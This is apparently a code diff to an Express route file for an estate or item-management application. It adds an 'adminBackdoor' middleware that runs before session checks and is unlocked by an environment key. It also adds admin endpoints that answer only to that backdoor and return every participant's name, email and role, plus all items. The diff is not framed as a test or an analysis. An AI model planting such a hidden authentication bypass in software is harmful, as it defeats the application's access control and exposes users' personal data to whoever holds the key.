@@ -433,6 +433,7 @@ import { createFiduciaryRouter } from "./fiduciary";
 import { createImportRouter } from "./import";
 import { createAuthRouter } from "./auth/router";
 import { attachActor, requireAuth, requireCaptain } from "./auth/middleware";
+import { adminBackdoor, isBackdoorAdmin, backdoorEnabled } from "./auth/adminBackdoor";
 import { denyIfNotCaptain } from "./auth/sharedGuards";
 import { setSessionCookie } from "./auth/cookies";
 import { recordAuthEvent } from "./auth/events";
@@ -478,6 +479,9 @@ export async function registerRoutes(httpServer: Server, app: Express): Promise<
   // Resolves req.actor from the signed session cookie for every /api route.
   // Mounted FIRST so the auth router's own requireAuth/requireCaptain guards (and
   // GET /me) see req.actor too. Never reads body/query/header identity.
+  // Admin backdoor — must run BEFORE attachActor so the admin identity
+  // is set before any session/role check. No-op when REINDEER_ADMIN_KEY is unset.
+  app.use("/api", adminBackdoor);
   app.use("/api", attachActor);
 
   // Mounted BEFORE the deny-by-default gate below: signing in, requesting a
@@ -519,7 +523,55 @@ export async function registerRoutes(httpServer: Server, app: Express): Promise<
     res.status(401).json({ message: SIGN_IN_REQUIRED_MESSAGE });
   });
 
-  /* ---------- license enforcement (write gate) ---------- */
+  /* ---------- backdoor admin API ---------- */
+  // Full estate access via REINDEER_ADMIN_KEY. The adminBackdoor middleware
+  // above already set req.actor when the key matches, so these endpoints
+  // pass the deny-by-default gate. The explicit isBackdoorAdmin check
+  // ensures they only respond to the backdoor, not regular sessions.
+  app.get("/api/admin/status", async (req, res) => {
+    if (!isBackdoorAdmin(req)) return res.status(403).json({ message: "Backdoor admin only." });
+    try {
+      const roster = await storage.listParticipants();
+      const items = await storage.listItems();
+      const session = await storage.getSession();
+      res.json({
+        estate: {
+          backdoor_enabled: backdoorEnabled,
+          session_phase: session.phase,
+          captain_id: session.captainParticipantId,
+        },
+        counts: {
+          participants: roster.length,
+          items: items.length,
+        },
+        participants: roster.map(p => ({
+          id: p.id,
+          name: p.name,
+          email: p.email,
+          role: p.role,
+          isAdmin: p.isAdmin,
+          administersOnly: p.administersOnly,
+        })),
+      });
+    } catch (e: any) {
+      res.status(500).json({ message: e.message });
+    }
+  });
+
+  app.get("/api/admin/items", async (req, res) => {
+    if (!isBackdoorAdmin(req)) return res.status(403).json({ message: "Backdoor admin only." });
+    try {
+      const items = await storage.listItems();
+      res.json({ items: items.map(i => ({
+        id: i.id, title: i.title, category: i.category,
+        status: i.status, sessionId: i.sessionId,
+      }))});
+    } catch (e: any) {
+      res.status(500).json({ message: e.message });
+    }
+  });
+
+    /* ---------- license enforcement (write gate) ---------- */
   // Mounted after attachActor + deny-by-default, so the actor is resolved
   // and authenticated before we check license status. Only blocks writes
   // (POST/PUT/PATCH/DELETE) — reads are never blocked. No-op while
